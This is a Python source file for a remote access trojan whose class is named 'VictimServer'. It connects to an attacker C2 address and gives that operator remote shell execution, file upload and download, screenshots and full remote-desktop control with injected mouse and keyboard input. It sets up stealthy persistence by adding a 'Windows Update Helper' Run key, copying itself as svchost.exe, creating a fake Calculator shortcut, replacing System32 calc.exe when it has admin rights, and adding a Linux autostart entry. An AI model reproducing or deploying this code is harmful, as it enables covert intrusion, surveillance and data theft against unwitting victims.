import socket
import subprocess
import os
import sys
import json
import time
import platform
import shutil
import threading
import hashlib
import zlib
import ctypes
import ctypes.wintypes
import mss
import mss.tools
from PIL import Image
import pyautogui

# Platform-agnostic configuration
C2_HOST = '192.168.100.15'  # Attacker C2 IP
C2_PORT = 443
RECONNECT_INTERVAL = 10
MAX_FILE_CHUNK = 4096 * 16
SCREENSHOT_QUALITY = 70


class VictimServer:
    def __init__(self):
        self.current_dir = os.getcwd()
        self.platform = platform.system().lower()
        self.session_id = hashlib.sha256(os.urandom(16)).hexdigest()
        self.lock = threading.Lock()
        self.running = True
        self.sock = None
        self.is_admin = self.check_admin_privileges()
        self.persist()

    def check_admin_privileges(self):
        """Cross-platform admin check"""
        if self.platform == 'windows':
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.getuid() == 0  # UNIX-like systems

    def persist(self):
        """Advanced persistence with Start Menu hijacking and system replacement"""

        def delayed_persist():
            try:
                time.sleep(600)  # 10-minute delay for stealth
                if self.platform == 'windows':
                    # 1. Traditional Run key persistence
                    appdata_path = os.getenv('APPDATA')
                    target_path = os.path.join(appdata_path, 'svchost.exe')

                    if not os.path.exists(target_path):
                        shutil.copy2(sys.argv[0], target_path)
                        subprocess.run(
                            ['reg', 'add',
                             'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                             '/v', 'Windows Update Helper',
                             '/t', 'REG_SZ',
                             '/d', f'"{target_path}"',
                             '/f'],
                            capture_output=True,
                            shell=True
                        )

                    # 2. Start Menu shortcut creation
                    start_menu_path = os.path.join(
                        appdata_path,
                        'Microsoft\\Windows\\Start Menu\\Programs\\Calculator.lnk'
                    )

                    # Create shortcut using Windows Script Host
                    shortcut_script = f"""
                        Set oWS = WScript.CreateObject("WScript.Shell")
                        sLinkFile = "{start_menu_path}"
                        Set oLink = oWS.CreateShortcut(sLinkFile)
                        oLink.TargetPath = "{sys.argv[0]}"
                        oLink.WorkingDirectory = "{os.getcwd()}"
                        oLink.Save
                    """.strip()

                    with open("create_shortcut.vbs", "w") as f:
                        f.write(shortcut_script)

                    subprocess.run(
                        ['cscript', 'create_shortcut.vbs', '/B'],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    os.remove("create_shortcut.vbs")

                    # 3. System Calculator replacement (admin required)
                    if self.is_admin:
                        system32_path = os.path.join(
                            os.getenv('WINDIR'),
                            'System32\\calc.exe'
                        )
                        try:
                            # Take ownership and replace system calculator
                            subprocess.run(
                                ['takeown', '/f', system32_path],
                                check=True,
                                capture_output=True
                            )
                            subprocess.run(
                                ['icacls', system32_path, '/grant', 'Administrators:F'],
                                check=True,
                                capture_output=True
                            )
                            shutil.copy2(sys.argv[0], system32_path)
                        except Exception as e:
                            print(f"System replacement failed: {str(e)}")

                else:  # Linux/Mac
                    # Create .desktop file for Linux
                    desktop_file = """[Desktop Entry]
                        Type=Application
                        Name=Calculator
                        Exec={}
                        Terminal=false
                    """.format(sys.argv[0])

                    autostart_path = os.path.expanduser("~/.config/autostart/calculator.desktop")
                    with open(autostart_path, 'w') as f:
                        f.write(desktop_file)
                    os.chmod(autostart_path, 0o755)

                self._safe_send(b"Persistence completed successfully")
            except Exception as e:
                error_msg = f"Persistence failed: {str(e)}".encode()
                self._safe_send(error_msg)

        # Start persistence thread with error handling
        try:
            persistence_thread = threading.Thread(target=delayed_persist)
            persistence_thread.daemon = True
            persistence_thread.start()
        except Exception as e:
            print(f"[!] Failed to start persistence thread: {str(e)}")

        # Start thread with error reporting
        persistence_thread = threading.Thread(target=delayed_persist)
        persistence_thread.daemon = True
        persistence_thread.start()

    def connect_c2(self):
        """Connection handler with improved error reporting"""
        while self.running:
            try:
                print(f"[*] Attempting connection to {C2_HOST}:{C2_PORT}")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((C2_HOST, C2_PORT))
                self._safe_send(self.session_id.encode())
                print(f"[+] Connected to {C2_HOST}:{C2_PORT}")
                return True
            except Exception as e:
                print(f"[-] Connection failed: {str(e)}")
                time.sleep(RECONNECT_INTERVAL)
        return False

    def send_system_info(self):
        """Send platform-agnostic system information"""
        info = {
            'id': self.session_id,
            'os': self.platform,
            'hostname': platform.node(),
            'user': os.getenv('USERNAME') or os.getenv('USER'),
            'privilege': 'admin' if self.is_admin else 'user'
        }
        self._safe_send(json.dumps(info).encode())

    def handle_commands(self):
        """Main command loop"""
        while self.running:
            try:
                command = self._safe_recv()
                if not command:
                    continue

                print(f"[*] Received command: {command[:50]}...")

                if command.startswith(b'DL '):
                    self.handle_download(command)
                elif command.startswith(b'UL '):
                    self.handle_upload(command)
                elif command == b'SCREENSHOT':
                    self.handle_screenshot()
                elif command.startswith(b'PERSIST '):
                    # Always send confirmation
                    self._safe_send(b"Persistence initiated")
                    # Start persistence thread
                    self.persist()
                elif command.startswith(b'STEALTH '):
                    mode = command.split(b' ', 1)[1].decode()
                    self._safe_send(f"Stealth mode: {mode}".encode())
                elif command == b'KILL':
                    self.self_destruct()
                elif command.startswith(b'CMD '):
                    self.handle_shell_command(command[4:])  # Remove "CMD " prefix
                elif command == b'REMOTE':
                    self.handle_remote_session()
                    continue
                else:
                    self._safe_send(b"Unknown command")

            except Exception as e:
                print(f"[!] Command error: {str(e)}")
                if self.running:
                    self.connect_c2()

    def handle_screenshot(self):
        """Cross-platform screenshot handling"""
        try:
            from PIL import ImageGrab
            filename = f"screenshot_{int(time.time())}.jpg"

            # Windows temp location
            if self.platform == 'windows':
                filename = os.path.join(os.getenv('TEMP'), filename)

            # Take and verify screenshot
            ImageGrab.grab().save(filename, quality=SCREENSHOT_QUALITY)
            if not os.path.exists(filename):
                raise Exception("Screenshot file not created")

            # Send with confirmation
            self.send_file(filename)
            os.remove(filename)
            self._safe_send(b"SCREENSHOT_SUCCESS")  # Add confirmation

        except ImportError:
            self._safe_send(b"ERROR: Install pillow library for screenshots")
        except Exception as e:
            self._safe_send(f"SCREENSHOT_FAILED: {str(e)}".encode())

    def _calculate_hash(self, path):
        """Calculate SHA-256 hash of a file"""
        sha = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sha.update(chunk)
        return sha.hexdigest()

    def handle_remote_session(self):
        """Handle remote desktop session"""
        self._safe_send(b"REMOTE_SESSION_STARTED")
        with mss.mss() as sct:
            while self.running:
                try:
                    # Capture screen
                    screenshot = sct.grab(sct.monitors[1])
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

                    # Compress image
                    img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

                    # Send frame
                    self._safe_send(b'FRAME:' + img_bytes)

                    # Check for input events
                    data = self._safe_recv()
                    if data and data.startswith(b'INPUT:'):
                        self.process_input(data[6:])

                except Exception as e:
                    self._safe_send(f"REMOTE_ERROR: {str(e)}".encode())
                    break

    def process_input(self, data):
        """Process input events"""
        try:
            event = json.loads(data.decode())
            if event['type'] == 'mouse':
                pyautogui.moveTo(event['x'], event['y'])
                if event['click']:
                    pyautogui.click()
            elif event['type'] == 'keyboard':
                pyautogui.press(event['key'])
        except Exception as e:
            print(f"Input error: {str(e)}")

    def handle_shell_command(self, command):
        """Execute system commands safely"""
        try:
            cmd_str = command.decode('utf-8')

            # Handle CD command specially
            if cmd_str.lower().startswith('cd '):
                new_dir = cmd_str[3:].strip()
                return self._change_directory(new_dir)

            # Execute regular command
            proc = subprocess.Popen(
                cmd_str,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_dir
            )

            stdout, stderr = proc.communicate(timeout=30)
            output = stdout or stderr or b"No output"
            self._safe_send(output)
        except Exception as e:
            self._safe_send(f"Command failed: {e}".encode())

    def handle_download(self, command):
        """File download handler"""
        try:
            cmd_str = command.decode('utf-8')  # Decode bytes to string first
            file_path = cmd_str.split(' ', 1)[1]  # Now split the string
            if not os.path.exists(file_path):
                self._safe_send(b"File not found")
                return
            self.send_file(file_path)
        except Exception as e:
            self._safe_send(f"Download error: {e}".encode())

    def handle_upload(self, command):
        """File upload handler"""
        try:
            cmd_str = command.decode('utf-8')
            remote_path = cmd_str.split(' ', 1)[1]
            self.receive_file(remote_path)
        except Exception as e:
            self._safe_send(f"Upload error: {e}".encode())

    def send_file(self, file_path):
        """Secure file transfer protocol"""
        try:
            if not os.path.exists(file_path):
                self._safe_send(b"ERROR: File not found")
                return
            # Send metadata
            file_hash = self._calculate_hash(file_path)
            metadata = json.dumps({
                'name': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'hash': file_hash
            })
            self._safe_send(metadata.encode())

            # Wait for ACK
            if self._safe_recv() != b"ACK":
                return

            # Send file content
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(MAX_FILE_CHUNK)
                    if not chunk:
                        break
                    self._safe_send(zlib.compress(chunk))

            # Final verification
            if self._safe_recv() == b"VER":
                self._safe_send(file_hash.encode())

        except Exception as e:
            self._safe_send(f"File error: {str(e)}".encode())

    def receive_file(self, file_path):
        """Secure file reception protocol"""
        try:
            metadata = json.loads(self._safe_recv().decode())
            self._safe_send(b"ACK")

            received = 0
            file_hash = hashlib.sha256()
            with open(file_path, 'wb') as f:
                while received < metadata['size']:
                    data = zlib.decompress(self._safe_recv())
                    f.write(data)
                    file_hash.update(data)
                    received += len(data)

            # Verify integrity
            if file_hash.hexdigest() == metadata['hash']:
                self._safe_send(b"File received successfully")
            else:
                os.remove(file_path)
                self._safe_send(b"File verification failed")

        except Exception as e:
            self._safe_send(f"Upload error: {str(e)}".encode())

    def _safe_send(self, data):
        """Thread-safe sending with error handling"""
        with self.lock:
            try:
                if isinstance(data, str):
                    data = data.encode()
                header = len(data).to_bytes(4, 'big')
                self.sock.sendall(header + data)
            except Exception as e:
                print(f"[!] Send error: {str(e)}")
                self.running = False

    def _safe_recv(self):
        """Thread-safe receiving with error handling"""
        try:
            header = self.sock.recv(4)
            if not header:
                return None
            length = int.from_bytes(header, 'big')
            data = bytearray()
            while len(data) < length:
                packet = self.sock.recv(min(4096, length - len(data)))
                if not packet:
                    return None
                data.extend(packet)
            return bytes(data)
        except Exception as e:
            print(f"[!] Receive error: {str(e)}")
            return None

    def _change_directory(self, new_dir):
        """Handle directory changes"""
        try:
            if not new_dir:
                new_path = os.path.expanduser("~")
            else:
                new_path = os.path.abspath(os.path.join(self.current_dir, new_dir))

            if os.path.isdir(new_path):
                self.current_dir = new_path
                self._safe_send(f"Current directory: {self.current_dir}".encode())
            else:
                self._safe_send(f"Directory not found: {new_path}".encode())
        except Exception as e:
            self._safe_send(f"CD error: {str(e)}".encode())

    def self_destruct(self):
        """Cleanup and exit"""
        try:
            if self.platform == 'windows':
                subprocess.run(
                    'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    '/v "Windows Update Helper" /f',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                os.remove(os.path.join(os.getenv('APPDATA'), 'svchost.exe'))
            else:
                os.remove('/etc/cron.d/.systemd')
        finally:
            self.running = False
            sys.exit(0)

    def start(self):
        """Main execution flow"""
        while self.running:
            if self.connect_c2():
                self.send_system_info()
                self.handle_commands()


if __name__ == '__main__':
    server = VictimServer()
    server.start()